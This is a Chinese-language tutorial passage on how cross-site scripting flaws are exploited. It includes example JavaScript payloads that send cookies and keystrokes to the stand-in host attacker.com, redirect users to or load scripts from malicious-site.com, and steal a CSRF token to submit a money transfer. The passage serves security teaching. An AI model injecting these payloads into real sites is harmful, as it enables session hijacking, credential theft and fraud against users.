### XSS 利用方式

**1. 窃取 Cookie 和 Session**

这是最常见且危害最大的利用方式之一。通过执行恶意 JavaScript，攻击者可以获取用户的 Cookie，特别是那些用于身份验证的 Session Cookie。一旦获得，攻击者就可以冒充用户身份，无需密码即可登录网站，窃取个人信息、进行非法操作，比如转账或发布恶意内容

恶意代码示例：

```javascript
<script>
  document.location = 'http://attacker.com/cookie_stealer.php?c=' + document.cookie;
</script>
```

这段代码会将当前页面的所有 Cookie 发送到攻击者的服务器上

**2. 键盘记录**

攻击者可以植入键盘记录器来捕获用户在当前页面输入的所有信息，包括用户名、密码、信用卡号等敏感数据。这种方式尤其危险，因为用户可能在毫无察觉的情况下泄露重要信息

```javascript
<script>
  document.onkeypress = function(e) {
    // 将用户按键信息发送到攻击者服务器
    fetch('http://attacker.com/keylogger.php?key=' + e.key);
  };
</script>
```

**3. 钓鱼攻击**

通过 XSS，攻击者可以篡改网页内容，插入虚假的登录框或提示信息，诱骗用户输入账户和密码。例如，在合法网站的页面上弹出一个伪造的登录框，提示用户“您的会话已过期，请重新登录”。用户以为是正常操作，输入信息后，这些信息就会被发送到攻击者的服务器

**4. 网页挂马和恶意重定向**

攻击者可以利用 XSS 将用户浏览器重定向到恶意网站，或者在当前页面上加载恶意脚本（例如，加密勒索病毒）

恶意代码示例：

```javascript
<script>
  window.location.href = "http://malicious-site.com";
</script>
```

或者加载一个恶意脚本：

```javascript
<script src="http://malicious-site.com/malware.js"></script>
```

**5. 绕过同源策略**

虽然浏览器的同源策略限制了不同源的脚本互相访问，但在某些特定情况下，XSS 可以作为绕过同源策略的第一步。一旦在目标域上执行了脚本，攻击者就可以访问该域下的敏感数据，比如通过 AJAX 请求获取用户的私人信息

**6. 盗用 CSRF Token**

许多网站使用 CSRF Token 来防御跨站请求伪造攻击。但如果存在 XSS 漏洞，攻击者可以轻松地通过 JavaScript 获取页面中的 CSRF Token，然后构造一个合法的请求（例如，转账请求），并代表用户提交

恶意代码示例：

```javascript
<script>
  // 通过 AJAX 请求获取页面内容
  fetch('/user/profile').then(response => response.text()).then(html => {
    // 从 HTML 中解析 CSRF Token，并构造一个请求
    const csrfToken = html.match(/csrf-token" content="(.*?)">/)[1];
    fetch('/transfer', {
      method: 'POST',
      body: `amount=1000&to=attacker&_csrf=${csrfToken}`
    });
  });
</script>
```

**7. DOM 篡改**

攻击者可以修改页面上的 DOM 元素，例如，隐藏或替换页面上的某些内容，或者插入广告、恶意链接等